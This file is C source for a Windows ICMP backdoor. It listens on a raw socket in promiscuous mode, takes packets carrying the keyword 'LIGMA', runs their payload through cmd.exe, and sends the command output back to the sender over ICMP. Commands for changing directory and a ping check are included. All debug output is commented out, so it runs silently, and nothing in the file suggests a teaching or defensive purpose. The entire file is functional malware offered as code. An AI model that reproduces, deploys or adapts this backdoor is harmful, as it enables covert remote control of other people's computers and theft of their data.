#define WIN32_LEAN_AND_MEAN

#include "stdio.h"
#include "winsock2.h"
#include "ws2tcpip.h"
#include "Mstcpip.h"
#include <Windows.h>

// Need to link with Ws2_32.lib
#pragma comment (lib, "Ws2_32.lib")

char* cmd_init = "LIGMA";
char finalsend[] = {0,0,0,0,0,0,0,0,'B','A','L','L','S','B','I','T','C','H'};
char cmdend[] = " 2>&1";


int find_keyword(char* buf, int size) {
    int cmd_init_size = strlen(cmd_init);
    for(int i = 0; i < size - cmd_init_size; i++) {
        char test[100];
        memcpy(test, &buf[i], cmd_init_size);
        test[5] = 0;
        if (strcmp(test, cmd_init) == 0) {
            return i + cmd_init_size;
        }
    }
    return -1;
}

int main(void)
{
    WSADATA wsaData;
    int iResult;
    SOCKET ListenSocket = INVALID_SOCKET;
    struct addrinfo* result = NULL;
    struct addrinfo hints;
    int iSendResult;

    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        //printf("WSAStartup failed with error: %d\n", iResult);
        return 1;
    }

    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_RAW;
    hints.ai_protocol = 1;

    iResult = getaddrinfo("", "0", &hints, &result);
    if (iResult != 0) {
        //printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return 1;
    }

    ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (ListenSocket == INVALID_SOCKET) {
        //printf("socket failed with error: %ld\n", WSAGetLastError());
        freeaddrinfo(result);
        WSACleanup();
        return 1;
    }

    if (iResult == SOCKET_ERROR) {
        //printf("bind failed with error: %d\n", WSAGetLastError());
        freeaddrinfo(result);
        closesocket(ListenSocket);
        WSACleanup();
        return 1;
    }

    ADDRINFOA* current = result;
    do {
        char local_ip[1000];
        int local_size = sizeof(local_ip);
        int ip_grabberx = WSAAddressToStringA(current->ai_addr, (int)current->ai_addrlen, 0, &local_ip, &local_size);
        //printf("%s\n", local_ip);
        bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
        current = current -> ai_next;
    } while (current != NULL);

    int optval;

    if(setsockopt(ListenSocket, IPPROTO_IP, IP_HDRINCL, (char *)&optval, sizeof(optval)) == -1){
        //printf("Error in setsockopt(): %d\n", WSAGetLastError());
        freeaddrinfo(result);
        closesocket(ListenSocket);
        WSACleanup();
        return 1;
    }

    optval = 1;
    int in;
    WSAIoctl(ListenSocket, SIO_RCVALL, &optval, sizeof(optval), 0, 0, (LPDWORD) &in, 0, 0);

    //printf("server is listening\n");

    while (1)
    {    
        struct sockaddr SenderAddr;
        int SenderAddrSize = sizeof(SenderAddr);
        memset(&SenderAddr, 0, SenderAddrSize);

        char buf[2000];
        memset(buf, 0, 2000);

        iResult = recvfrom(ListenSocket, buf, 2000, 0, &SenderAddr, &SenderAddrSize);
        if (iResult == SOCKET_ERROR) {
            //printf("recieve failed with error: %d\n", WSAGetLastError());
        } else {
            buf[iResult] = 0;
            char source_ip[1000];
            int size = sizeof(source_ip);
            int ip_grabber = WSAAddressToStringA(&SenderAddr, sizeof(SenderAddr), 0, &source_ip, &size);

            int local_match = 0;
            ADDRINFOA* current = result;
            do {
                char local_ip[1000];
                int local_size = sizeof(local_ip);
                int ip_grabberx = WSAAddressToStringA(current->ai_addr, (int)current->ai_addrlen, 0, &local_ip, &local_size);
                if (strcmp(source_ip, local_ip) == 0) {
                    local_match = 1;
                    break;
                }
                current = current -> ai_next;
            } while (current != NULL);

            if (local_match) {
                continue;
            }

            int key_loc = find_keyword(buf, iResult);
            if (key_loc == -1) {
                continue;
            } else {
                //printf("%s > %s\n", source_ip, &buf[key_loc]);
            }
            
            if (buf[key_loc] == 'c' && buf[key_loc+1] == 'd') {
                SetCurrentDirectory(&buf[key_loc + 3]);
                char ok[] = {0,0,0,0,0,0,0,0,'L','I','G','M','A','O','K'};
                sendto(ListenSocket, &ok, sizeof(ok), 0, &SenderAddr, SenderAddrSize);
                continue;
            }

            if (buf[key_loc] == 'P' && buf[key_loc+1] == 'I' && buf[key_loc+2] == 'N' && buf[key_loc+3] == 'G') {
                char pong[] = {0,0,0,0,0,0,0,0,'L','I','G','M','A','P','O','N','G'};
                sendto(ListenSocket, &pong, sizeof(pong), 0, &SenderAddr, SenderAddrSize);
                continue;
            }

            char cmd[1000] = "cmd.exe /c ";
            
            memcpy(&cmd[strlen(cmd)], &buf[key_loc], 1000-strlen(cmd));
            memcpy(&cmd[strlen(cmd)], cmdend, 1000-strlen(cmd));
            char   psBuffer[900];
            memset(psBuffer, 0, 900);
            FILE   *pPipe;
            if( (pPipe = _popen( cmd, "rt" )) == NULL ) {
                continue;
            }
            while(fgets(psBuffer, 900, pPipe))
            {
                char sendBuffer[918];
                memset(sendBuffer, 0, 918);
                sendBuffer[8] = 'B';
                sendBuffer[9] = 'A';
                sendBuffer[10] = 'L';
                sendBuffer[11] = 'L';
                sendBuffer[12] = 'S';
                memcpy(&sendBuffer[13], psBuffer, 900);
                
                sendto(ListenSocket, &sendBuffer, 918, 0, &SenderAddr, SenderAddrSize);
                memset(psBuffer, 0, 900);
            }
            sendto(ListenSocket, &finalsend, sizeof(finalsend), 0, &SenderAddr, SenderAddrSize);
        }
    }
}
